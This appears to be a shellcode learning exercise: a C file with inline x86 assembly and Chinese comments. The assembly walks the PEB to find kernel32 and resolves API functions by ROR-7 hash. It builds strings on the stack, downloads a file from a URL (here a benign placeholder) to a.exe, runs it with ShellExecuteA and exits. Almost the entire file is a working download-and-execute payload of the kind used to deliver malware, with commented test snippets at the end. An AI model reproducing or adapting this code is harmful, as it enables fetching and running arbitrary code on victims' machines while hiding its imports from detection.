#include <Windows.h>
#include <stdio.h>

DWORD get_hash(char *str)
{
	DWORD hash= 0;
	while(*str)
	{
		hash = ((hash<<25|hash>>7));
		hash += *str;
		str++;
	}
	return hash;
}

int main()
{
	//需要补ole32.dll中CoInitialize函数调用，参数NULL,初始化COM
	HRESULT comHr;
	comHr = CoInitialize(NULL);
	__asm{
		sub sp,0104h			;抬高栈顶
		mov ebp,esp				;构造新栈

		xor eax,eax
		mov ax,6E6Fh			;"on00"
		push eax
		push 6D6C7275h			;"urlm",压入"urlmon"字符串

		xor eax,eax
		push 0xff32336C			;字符串"l32"
		push 0x6C656873			;字符串"shel"

		xor eax,eax
		mov byte ptr[esp+07h],al;把"l32"后面的ff变成00，截断字符串
		mov al,2Fh
		push eax
		push 6D6F632Eh
		push 75646961h
		push 622E7777h
		push 772F2F3Ah
		push 70747468h			;压入字符串"http://www.baidu.com/"

		xor eax,eax
		mov al,65h				
		push eax				;压入字符"e"
		push 78652E61h			;压入字符串"a.ex"

		cdq
		mov ebx,fs:[edx+30h]	;PEB地址
		mov ecx,[ebx+0ch]		;ldr地址
		mov ecx,[ecx+1ch]		;初始化顺序模块列表地址
		mov ecx,[ecx]			;指向第二个
		mov ecx,[ecx+08h]		;kernel32基址
		push ecx				;保存kernel32基址
		
		push 0x0C917432			;压入"LoadLibraryA"的hash值
		push ecx				;压入kernel32的基址
		mov bl,01h				;阶段1
		jmp FindFunc			;查找LoadLibraryA()函数地址
	MainTemp:
		cmp bl,01h				;判断阶段1,加载urlmon.dll，获取URLDownloadToFileA函数地址
		jz MainTemp1
		cmp bl,02h				;判断阶段2,下载文件，获取ShellExecuteA函数地址
		jz MainTemp2
		cmp bl,03h				;判断阶段3，执行文件，获取ExitProcess函数地址
		jz MainTemp3
		cmp bl,04h				;判断阶段4，执行退出操作
		jz MainTemp4
	MainTemp1:
		lea ecx,dword ptr[ebp-08h];获取urlmon字符串地址
		push eax				;保存LoadLibraryA的函数地址，call调用LoadLibraryA函数结束eax的值会变成函数返回值
		push ecx				;压入"urlmon"字符串地址
		call eax				;调用LoadLibraryA()加载urlmon.dll
		
		push 0x9AAFD680			;压入"URLDownloadToFileA"字符串的hash值
		push eax				;压入urlmon.dll的基址
		mov bl,02h				;阶段2
		jmp FindFunc			;查询URLDownloadToFileA函数地址
	MainTemp2:					
		cdq
		push edx				;0
		push edx				;0
		lea ecx,dword ptr[ebp-30h];计算字符串"a.exe"的地址
		push ecx
		lea ecx,dword ptr[ebp-28h];计算字符串"http://www.baidu.com/"的地址
		push ecx			
		push edx				;0
		call eax				;HRESULT URLDownloadToFile(LPUNKNOWN pCaller,LPCTSTR szURL,LPCTSTR szFileName,DWORD dwReserved,LPBINDSTATUSCALLBACK lpfnCB);

		lea ecx,dword ptr [ebp-10h];获取字符串"shell32"的地址
		push ecx
		call [ebp-38h]			;调用LoadLibraryA函数

		push 0x213BCB58			;压入字符串"ShellExecuteA"的hash值
		push eax				;压入shell32.dll基址
		mov bl,03h				;阶段3
		jmp FindFunc			;查询ShellExecuteA函数地址

	MainTemp3:
		cdq
		push edx				;0
		push edx				;0
		push edx				;0
		lea ecx,dword ptr [ebp-30h];获取字符串"a.exe"的地址
		push ecx
		push edx				;0
		push edx				;0
		call eax				;调用函数HINSTANCE ShellExecuteA(
								;	HWND   hwnd,         // 父窗口句柄
								;	LPCSTR lpOperation,  // 动作/操作（动词）
								;	LPCSTR lpFile,       // 目标文件、程序、路径或网址
								;	LPCSTR lpParameters, // 命令行参数
								;	LPCSTR lpDirectory,  // 默认工作目录
								;	INT    nShowCmd      // 窗口显示方式
								;);
		
		push 0x4FD18963			;压入字符串"ExitProcess"的hash值
		push [ebp-34h]			;压入kernel32基址
		mov bl,04h				;阶段4
		jmp FindFunc			;查询ExitProcess函数地址
	MainTemp4:
		cdq
		push edx				;0
		call eax				;调用ExitProcess函数

	FindFunc:
		push ebp				;保存栈底
		mov ebp,esp				;创建新栈
		push ebx				;保存阶段1

		mov ebx,dword ptr [ebp+04h];调用FindFunc之前ecx的值(在哪个dll查询函数)
		mov eax,[ebx+3ch]		;PE头偏移
		mov ecx,[eax+ebx+78h]	;"eax+ebx+78h"是"DataDirectory[0].VirtualAddress"的地址，取值后是导出表的RVA
		add ecx,ebx				;导出表地址
		mov edx,[ecx+20h]		;函数名索引RVA
		add edx,ebx				;函数名索引地址
		xor edi,edi				;记录函数名下标序号
	FindFuncLoop:
		inc edi
		mov esi,[edx+edi*4]		;对应edi下标的函数名偏移
		add esi,ebx				;函数名地址
		push esi				;保存函数名地址
		jmp GetHash
	FindFuncTemp:				;为了GetHash之后能回来
		cmp eax,dword ptr[ebp+08h];拿到LoadLibraryA的字符串的哈希值并判断
		jnz FindFuncLoop		;跳转到循环
		mov eax,[ecx+24h]		;从导出表地址找到序号变换索引RVA
		add eax,ebx				;序号变换索引地址
		mov di,[eax+edi*2]		;edi是变换后的序号
		mov eax,[ecx+1ch]		;函数地址数组的RVA
		add eax,ebx				;函数地址数组的地址
		mov eax,[eax+edi*4]		;函数地址的RVA
		add eax,ebx				;函数地址
		jmp FindFuncReturn
		nop
	FindFuncReturn:
		pop ebx					;还原阶段1
		mov esp,ebp				;释放FindFunc的栈
		pop ebp					;还原调用FindFunc前的栈底
		add esp,08h				;弹出kernel32基址和LoadLibraryA字符串的hash值
		jmp MainTemp			;回到Main主函数

	GetHash:
		push ebp				;保存调用GetHash前的栈底
		mov ebp,esp				;创建新栈
		push ebx				;保存dll基址
		push ecx				;保存导出表地址
		push edx				;保存函数名索引地址
		xor eax,eax				;字符串哈希值结果
		xor ebx,ebx				;临时存储单个字节
		cdq						;用于判断是否到字符串结尾
		mov ecx,dword ptr [ebp+04h];函数名地址
	HashLoop:
		cmp dl,byte ptr[ecx]	;判断是否为字符串结尾
		jz GetHashReturn		;字符串遍历到结尾退出
		ror eax,7				;循环右移7位
		movsx ebx,byte ptr[ecx]	;取单个字符，扩展成32位
		add eax,ebx				;把字符加到字符串哈希结果中
		inc ecx					;移动字符串指针，指向下一个字符
		jmp HashLoop			;跳转到循环开始
		nop
	GetHashReturn:
		pop edx					;恢复函数名索引地址
		pop ecx					;恢复导出表地址
		pop ebx					;恢复dll基址
		mov esp,ebp				;清理GetHash的栈
		pop ebp					;恢复调用GetHash前的栈底
		add esp,04h				;清理调用GetHash压入栈中的参数(函数名地址)
		jmp FindFuncTemp		;回到FindFunc继续判断目标哈希值是否一致
	}
	DWORD hash = get_hash("URLDownloadToFileA");
	printf("%08X\n",hash);
	return 0;
}
/*
#include <urlmon.h>
#include <stdio.h>

#pragma comment(lib, "urlmon.lib")

HRESULT hr;

int main()
{
	hr = URLDownloadToFileA(
		NULL,
		"file:///C:/Windows/win.ini",
		"a.exe",
		0,
		NULL
	);

	printf("hr = %08X\n", hr);
	return 0;
}*/

/*
#include <windows.h>
#include <urlmon.h>
#include <stdio.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")

int main()
{
    //HRESULT initHr;
    HRESULT hr;

    //initHr = CoInitialize(NULL);

    hr = URLDownloadToFileA(
        NULL,
        "http://www.baidu.com/",
        "test.html",
        0,
        NULL
    );

    //printf("CoInitialize = %08lX\n", initHr);
    printf("download     = %08lX\n", hr);

    //if (SUCCEEDED(initHr))
    //    CoUninitialize();

    return 0;
}*/